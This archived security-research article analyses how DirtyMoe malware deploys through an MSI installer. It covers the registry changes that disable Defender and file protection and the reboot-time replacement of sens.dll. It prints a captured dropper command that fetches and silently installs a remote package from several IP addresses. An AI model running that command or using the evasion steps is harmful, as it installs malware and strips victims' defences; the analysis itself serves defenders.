{
    "id": "3bf653e4-7fd7-4274-9833-3d89829d0591",
    "created_at": "2023-01-12T15:04:19.0436Z",
    "updated_at": "2025-03-27T02:05:22.415009Z",
    "deleted_at": null,
    "sha1_hash": "30c2f3e525e0afde7150d94795c6577a69058ff8",
    "title": "2021-11-03 - DirtyMoe- Deployment",
    "authors": "",
    "file_creation_date": "2022-05-27T22:37:34Z",
    "file_modification_date": "2022-05-27T22:37:34Z",
    "file_size": 473781,
    "plain_text": "# DirtyMoe: Deployment\n\n**decoded.avast.io/martinchlumecky/dirtymoe-4/**\n\nby [Martin ChlumeckýNovember 3, 202115 min read](https://decoded.avast.io/author/martinchlumecky/)\n\n**Abstract**\n\n\nNovember 3, 2021\n\n\nIn the [first article, we have described a complex malware, called DirtyMoe, from a high-level point of](https://decoded.avast.io/martinchlumecky/dirtymoe-1)\nview. Most of the captured samples were MSI Installer packages which were delivered onto a victim’s\nmachine by the PurpleFox exploit kit. So in the fourth part of the DirtyMoe series, we will focus on\nDirtyMoe’s deployment and how DirtyMoe tackles various issues with different versions of Windows.\n\nTo understand what the MSI package executes on the victim’s machine, we have analyzed the MSI\npackage in terms of registry and file manipulations, installer’s arguments, and post-reboot operations.\nWe have also tried to put these actions into the context to determine the purpose of its individual\nactions in DirtyMoe’s deployment.\n\nThe DirtyMoe’s MSI installer abuses the Windows System Event Notification Service (SENS) to deploy\nDirtyMoe. The main goal of the MSI installer is to replace the system DLL file of SENS with a malicious\npayload and execute the payload as a legitimate service. Another essential point is configuring the\nanti-detection methods to keep DirtyMoe under the radar.\n\nThe DirtyMoe malware requires different locations of installed files and registry entries for each\nWindows version that the malware targets. Since the MSI Installer provides a convenient way to install\narbitrary software across versions of Windows, its usage seems like a logical choice.\n\n**1. Scope**\n\nWe have recorded two versions of MSI installer packages distributing DirtyMoe. Both versions perform\nvery similar actions for the successful DirtyMoe deployment. The main difference is the delivery of\nmalicious files via a CAB file. The older version of the MSI package includes the CAB file directly in the\npackage, while the newer version requires the CAB file in the same location as the package itself.\n\nThe effect of the separate CAB file easily allows managing payloads that need to be deployed.\nFurther, it reduces the size of the primary exploit payload because the CAB file can be downloaded\nafter successful exploitations.\n\n1.1 All in One Package (older version)\n\n\n-----\n\nThe example of the all in one package is a sample with SHA-256:\n\n```\n5ef702036c5c3aa2d0b6d8650e20b2c5f55776c69eebf8c700f1770b56a35c35\n\n```\n\nThe package details follow:\n\nProduct Name: `FONDQXIMSYHLISNDBCFPGGQDFFXNKBARIRJH`\nProduct Version: `2.0.0.0`\nProduct Code: `{80395032-1630-4C4B-A997-0A7CCB72C75B}`\nInstall Condition:\n\nis Windows NT (cannot be installed on Windows 9x/ME)\nis not Windows XP SP2 x64 or Windows Server 2003 SP2 x64\nis not Windows XP/2003 RTM, Windows XP/2003 SP1, Windows XP SP2 x86\nis not Windows NT 4.0\nis not Windows 2000\nnot exist `SOFTWARE\\SoundResearch\\UpdaterLastTimeChecked3 with value 3`\nFile Size: 2.36 MB\n\n1.2 Excluded Data Package (newer version)\n\nThe newer version of the MSI package consists of two parts. The first part is the MSI package itself\nand the separate CAB file containing the malicious payloads. The MSI package refers to one of the\nfollowing CAB files: `M0011.cab,` `M0021.cab,` `M0031.cab,,` `M0041.cab,` `M0051.cab,`\n```\nM0061.cab, M0071.cab . The CAB file contains three malicious files, but only one file\n\n```\n(sysupdate.log) is different for each CAB file. Detailed information about the file manipulation is\ndescribed in Section 3.\n\nThe example of the newer MSI package is a sample with SHA-256:\n\n```\n1233cc0b8f77213a229e64c6aa0e08bd18e075879734a18512b1990b6408764f\n\n```\n\nThe package details follow:\n\nProduct Name: `CTH3VNU8KZHDXY6YYCF9YV8OXGPW3P2APZPL`\nProduct Version: `2.0.0.0`\nProduct Code: `{80395032-1630-4C4B-A997-0A7CCB72C75B}`\nInstall Condition:\n\nis Windows NT (cannot be installed on Windows 9x/ME)\nis not Windows XP SP2 x64 or Windows Server 2003 SP2 x64\nis not Windows XP/2003 RTM, Windows XP/2003 SP1, Windows XP SP2 x86\nis not Windows NT 4.0\nis not Windows 2000\nnot exist `HKLM\\SOFTWARE\\Microsoft\\DirectPlay8\\Direct3D`\nnot exist `HKCU\\SOFTWARE\\7-Zip\\StayOnTop`\nFile Size: 1.020 MB\n\nNote: The product name is usually different for each .msi file. It is a random string composed of capital\nletters of length 36. The product code has so far been observed with the same value.\n\n**2. Registry Manipulation**\n\n\n-----\n\nThe malware authors prepare a victim environment to a proper state via the MSI installer. They focus\non disabling anti-spyware and file protection features. Additionally, the MSI package uses one system\nconfiguration to bypass Windows File Protection (WFP) to overwrite protected files despite the fact\nthat WFP should prevent replacing critical Windows system files [1].\n\nThere are several registry manipulations during MSI installation, though we will describe only the most\ncrucial registry entries.\n\n2.1 Mutex\n\n**UpdaterLastTimeChecked**\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\SoundResearch\\UpdaterLastTimeChecked[1-3]\n\n```\nOne of the malware registry entries is `UpdaterLastTimeChecked[x], where x signifies how many`\ntimes the MSI installer has been run. Each MSI installation of the package creates one entry. If\n```\nUpdaterLastTimeChecked3 is present, the following package installation is not allowed. It is\n\n```\napplicable only for the older version of the MSI package.\n\n**StayOnTop**\n```\nHKEY_CURRENT_USER\\SOFTWARE\\7-Zip\\StayOnTop = 1\n\n```\nThis registry manipulation is related only to the newer version. 7-Zip software does not support the\nstay on top feature. Therefore, it can be assumed that this registry entry serves as a flag that the\ninstaller package has been successfully run. SentinelLabs has published evidence that the\npresentence of this value indicates that a victim computer has been compromised by PurpleFox [2].\n\n**Direct3D**\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\DirectPlay8\\Direct3D\n\n```\nAn active instance of the DirtyMoe malware stores settings and meta-data in this registry entry in an\nencrypted form. Therefore, if this entry is present in the system registry, the MSI installation is aborted.\n\n2.2 Anti-Detection\n\n**DisableAntiSpyware**\n```\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware =\n1\n\n```\nMicrosoft Defender Antivirus can be disabled by the `DisableAntiSpyware registry key set to 1. So,`\nif the system has no 3 party antivirus product, the system is without protection against maliciousrd\nsoftware, including spyware [3].\n\n**SFCDisable**\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SFCDisable\n= 4\n\n```\nWindows File Protection (WFP) prevents non-system applications from replacing critical Windows\nsystem files that can cause problems with the operating system integrity and stability. WFP is typically\nenabled by default in all versions of Windows [4].\n\nNaturally, DirtyMoe wants to avoid a situation where WFP detects any manipulation with the system\nfiles. Therefore, the `SFCDisable value is set to four, enabling WFP, but every WFP action is not pop-`\nupped by GUI. The effect is that WFP is enabled, so no system alerts are invoked, but WFP warning is\nhidden for users. This is applicable only for Windows XP.\n\n\n-----\n\n**SFCScan**\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SFCScan =\n0\n\n```\nThe System File Checker (SFC) provides the ability to scan system-protected files. SFC verifies file\nversions, and if it detects any file manipulation, SFC updates files to the correct version. This registry\nmanipulation contributes to disabling SFC protecting the abused Windows service. This setup affects\nonly file scanning, but WFP can still be active.\n\n**SvcHostSplitThresholdInKB**\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SvcHostSplitThresholdInKB =\n0xFFFFFFFF\n\n```\nThe crucial registry manipulation controls the system startup and some aspects of device\nconfiguration. To understand the primary purpose of the `SvcHostSplitThresholdInKB registry`\nentry, we must describe the historical development of Windows services and a generic host process.\n\nIn most cases, Windows services are run from dynamic-link libraries that Windows executes via the\ngeneric host process (svchost.exe). The hosted process can load more services (DLLs) as threads\nwithin one process. This is a historical relict from the times of Windows XP where system memory\nused to be a scarce commodity. The system used a few service host processes that hosted all\nWindows services, represented by DLL files, as the process creation and maintenance were\nexpensive in terms of the system memory.\n\n**Figure 1 illustrates the example of run services and detailed information about the biggest host**\nservice process. Windows XP created 5 host processes grouped according to their purposes, such as\n_LocalService, NetworkService, and System. PID 1016 is the biggest process in point of the memory_\nusage view since this process hosts approx. 20 services. This approach saved the memory but made\nthe system more unstable because if one of the services crashed, the entire service chain hosted by\nthe same process was killed.\n\n\n-----\n\n**Figure 1. Service chain in Windows XP**\nNowadays, there is no reason to group services within a few processes, and the resulting positive\neffects are increased system stability and security, as well as easier error analysis. Services now\nusually no longer share processes; mini-programs for providing system functions have an exclusive\nmemory location. And if the svchost.exe process crashes, it no longer drags the entire service chain\nwith it [5].\n\nWindows 10 has come with a threshold value ( SvcHostSplitThresholdInKB ), determining when\nservices shall be created as a regular process. The default value is 380,000, so the grouping service\nmodel is used if the system has less than 3.5 GB of memory. In other words, the increasing threshold\nvalue can reduce the amount of the host processes, and therefore it determines if the service\nprocesses are split.\n\nLet’s give an example for Windows 10, if the value is set to 1, the number of host processes is approx.\n70. And the threshold value equal to maximum ( 0xFFFFFFFF ) causes that number of host processes\nto be only 26.\n\nIt is now understood that the maximum value of `SvcHostSplitThresholdInKB can hide details`\nabout run processes. Therefore, the malware author set the threshold value to the maximum to hide\nthe malicious service activity in threads. As a consequence, the malicious service is run within one\nhost process in one of its threads. Accordingly, tracking and forensic analysis are made more difficult\nsince the svchost process hosts many other services, and it is hard to assign system activities to the\nmalware service.\n\n2.3 Payload Delivery\n\n**SMBDeviceEnabled**\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters\\SMBDeviceEnabled\n= 0\n\n```\n\n-----\n\nIn order to prevent deployment of other malware via EternalBlue exploit [6], the MSI installer disables\nSMB sharing, effectively closing port 445 on Windows XP.\n\n**AllowProtectedRenames and PendingFileRenameOperations**\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session\nManager\\AllowProtectedRenames\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session\nManager\\PendingFileRenameOperations\n\n```\nThese registry entries are also related to WFP and therefore are crucial for the malicious code’s\ndeployment to the victim machine. The principle is the same as in the `MoveFileEx function with`\nMOVEFILE_DELAY_UNTIL_REBOOT flag [7]. In other words, the MSI installer defines which file will\nbe moved or deleted after reboot via the Session Manager Subsystem (SMSS) [8].\n\nThe malware authors abuse two system files, `sens.dll for Windows Vista and newer, and`\n\n`cscdll.dll for Windows XP, see` Section 3. Consequently, the SMSS replaces the critical system\nfile with the malicious ones after the system reboot.\n\nAn example of the `PendingFileRenameOperations value for Windows 7 32bit is as follows:`\n\n```\n\\??\\C:\\Windows\\AppPatch\\Acpsens.dll\n\n```\n```\n\\??\\C:\\Windows\\system32\\sens.dll\n\\??\\C:\\Windows\\AppPatch\\Acpsens.dll\n\\??\\C:\\Windows\\system32\\sens.dll\n\\??\\C:\\Windows\\winupdate32.log\n\\??\\C:\\Windows\\system32\\sens.dll\n\\??\\C:\\Windows\\AppPatch\\Ke583427.xsl\n\\??\\C:\\Windows\\sysupdate.log\n\\??\\C:\\Windows\\AppPatch\\Ke583427.xsl\n\n```\n**3. File Manipulation**\n\nDirtyMoe misuses the system services, precisely service DLL files, that are protected and which\nhandlers are open, so replacing these files is not possible without the system reboot. Therefore, the\nfirst phase of the file manipulation is to extract payloads from the CAB file, and the second phase\nreplaces the service DLL files with the extracted CAB files.\n\n3.1 File Extraction\n\nThe CAB file usually contains three payload files.\n```\n   winupdate32.log and winupdate64.log are malicious DLLs representing the DirtyMoe\n\n```\nservice.\n```\n   sysupdate.log is an encrypted executable file that contains the default DirtyMoe module\n\n```\ninjected by the DirtyMoe service.\n\n\n-----\n\nThe MSI installer extracts and copies payloads from the CAB file into defined destinations if an\nappropriate condition is met, as the following table summarizes.\n\n**File** **Destination** **Condition**\n\nsysupdate.log %windir% None\n\nwinupdate32.log %windir% NOT VersionNT64\n\nwinupdate64.log %windir% VersionNT64\n\nIf the required files are extracted into the proper destination, the MSI installer ends and waits silently\nfor the system to reboot. The next actions are performed by the SMSS.\n\n3.2 File Replacement\n\nThe Session Manager Subsystem (SMSS) ensures replacing abused system files that are systemprotected with the malicious ones based on `PendingFileRenameOperations registry entry; see`\nSection 2.3. In fact, the MSI installer invokes a post-reboot file manipulation based on a Windows\nversion as follows:\n\n**Windows XP**\n\nDelete (if exist) `%windir%\\\\AppPatch\\\\Acpcscdll.dll`\nMove `%windir%\\\\system32\\\\cscdll.dll to` `%windir%\\\\AppPatch\\\\Acpcscdll.dll`\nMove `%windir%\\\\winupdate32.log to` `%windir%\\\\system32\\\\cscdll.dll`\nDelete (if exist) `%windir%\\\\AppPatch\\\\Ke583427.xsl`\nMove `%windir%\\\\sysupdate.log to` `%windir%\\\\AppPatch\\\\Ke583427.xsl`\n\n**Windows Vista and newer**\n\nDelete (if exist) `%windir%\\\\AppPatch\\\\Acpsens.dll`\nMove `%windir%\\\\system32\\\\sens.dll to` `%windir%\\\\AppPatch\\\\Acpsens.dll`\nMove `%windir%\\\\winupdate64.log to` `%windir%\\\\system32\\\\sens.dll`\nDelete (if exist) `%windir%\\\\AppPatch\\\\Ke583427.xsl`\nMove `%windir%\\\\sysupdate.log to` `%windir%\\\\AppPatch\\\\Ke583427.xsl`\n\nThe difference between Windows XP and Windows Vista and newer is an exploit of a hosting service.\nWindows XP uses Offline Network Agent ( cscdll.dll ) loaded by winlogon.exe under NT\nAUTHORITY\\SYSTEM privileges. Windows Vista and newer provide System Event Notification\nService ( sens.dll ) also run under SYSTEM. The `Ke583427.xsl file is a default DirtyMoe module`\nthat is encrypted.\n\nIn short, the post-reboot operation slips DirtyMoe DLL into the system folder under the service name\nthat is registered legitimately in the system. Replacement of such system files is possible because it is\ncompleted by SMSS, which is the first user-mode process started by the kernel. For that reason no\nhandlers are created to the system DLL, and WFP is not also run yet. Finally, the malware represented\nby the slipped malicious DLL is started with system-level privileges since the abused service is\nregistered as the legitimate service in Windows.\n\n**4. Deployment Workflow**\n\n\n-----\n\nIf the PurpleFox successfully exploits a victim s machine, the MSI installer package is run with\nadministrator privileges. The MSI installer provides several options on how to install software silently,\nand therefore no user interaction is required. Although the system restart is necessary to apply all\nchanges, the MSI installer also supports delayed restart; therefore, the user does not detect any\nsuspicious symptoms. The installer only waits for the next system restart.\n\nAn example of how to run installation silently via MSI installer:\n```\nmsiexec.exe /i <dirtymoe.msi> /qn /norestart ; where /qn sets UI level to no UI.\n\n```\nWe have captured a specific example of how the MSI installer is run after the successful system\nexploit.\n```\nCmd /c for /d %i in (60.164.191.22:19400 185.51.201.102:19836 203.128.6.130:12315\n58.220.24.47:13384 155.138.159.232:17445) do Msiexec /i http:\\%i\\0BC8EC41.moe \\Q\n\n```\nThis dropper iterates five IP addresses that are different for each minute, including ports; see Section\n2 of the [first part of DirtyMoe series. The MSI installer is run for each IP address with parameter](https://decoded.avast.io/martinchlumecky/dirtymoe-1) `\\Q,`\nso if the requested remote location is not available or the MSI file does not exist, the installer does not\ninform the user about the error. The deployment process then runs silently in the background.\n\nThe MSI installer sets the system registry defined in Section 2 and copies malicious files to the\nWindows folder, see Section 3. The subsequent system restart will arrange the code execution of the\nmalicious DLL containing ServiceMain, which Windows starts as the SENS service. Given the\ncomplexity of the malicious service, we will return to its detailed description in the following blog post.\n\nUsually, the MSI installer caches installation files in `C:\\Windows\\Installer for future use, such as`\nupdating, reinstalling, etc. However, DirtyMoe does not keep the .msi backup file. The installer just\ncreates a hash file about the malware installation. The filename has the form `SourceHash{<Product`\n```\nCode>} . The file contains the name of the MSI source package. The most prevalent GUID is equal to:\n\n```\n```\n{80395032-1630-4C4B-A997-0A7CCB72C75B}\n\n```\n\nThe MSI Installer Rollback Script cannot remove the malware since deployed files are moved by the\nSMSS and are out of the MSI Installer scope.\n\nThe whole deployment workflow is illustrated in Figure 2.\n\n\n-----\n\n**Figure 2. DirtyMoe deployment workflow**\n\n\n**5. Conclusion**\n\n\n-----\n\nWe have introduced the deployment process of the DirtyMoe malware via the MSI Installer that\npresents an easy way of supporting multiple configurations for various Windows versions. The MSI\ninstaller prepares all necessary files and configuration for successful deployment of the malware and\nalso cleans up backup and cache files. However, there are a few symptoms that can reveal the\nDirtyMoe installations.\n\nAfter the system reboot, Session Manager overwrites the files representing one of the system services\nby the malicious DLL file. The system then runs an appropriate service and thereby loads the\nmalicious code, including the default DirtyMoe’s object, as the legitimate service.\n\nAll these steps deploy and run DirtyMoe on the victim’s machine. In point of the cyber kill chain,\ndetailed information about DirtyMoe service and further installation actions will be introduced in the\nfuture article.\n\n**References**\n\n[1] [Description of the Windows File Protection feature](https://support.microsoft.com/en-us/topic/description-of-the-windows-file-protection-feature-db28f515-6512-63d1-6178-982ed2022ffb)\n\n[2] [Purple Fox EK](https://www.sentinelone.com/labs/purple-fox-ek-new-cves-steganography-and-virtualization-added-to-attack-flow)\n\n[3] [Security Malware Windows Defender](https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/security-malware-windows-defender-disableantispyware)\n\n[4] [Enable or Disable Windows File Protection](https://www.technipages.com/enable-disable-wfp)\n\n[5] [Split Threshold for svchost.exe in Windows 10](https://www.tenforums.com/tutorials/94628-change-split-threshold-svchost-exe-windows-10-a.html)\n\n[6] [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)\n\n[7] [MoveFileExA function (winbase.h)](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefileexa?redirectedfrom=MSDN)\n\n[8] [Pending FileRename Operations](https://www.verboon.info/2010/02/pending-filerename-operations)\n\n[Tagged asDirtyMoe,](https://decoded.avast.io/tag/dirtymoe/) [series](https://decoded.avast.io/tag/series/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-03 - DirtyMoe- Deployment.pdf"
    ],
    "report_names": [
        "2021-11-03 - DirtyMoe- Deployment.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535859,
    "ts_updated_at": 1743041122,
    "ts_creation_date": 1653691054,
    "ts_modification_date": 1653691054,
    "files": {
        "pdf": "https://archive.orkl.eu/30c2f3e525e0afde7150d94795c6577a69058ff8.pdf",
        "text": "https://archive.orkl.eu/30c2f3e525e0afde7150d94795c6577a69058ff8.txt",
        "img": "https://archive.orkl.eu/30c2f3e525e0afde7150d94795c6577a69058ff8.jpg"
    }
}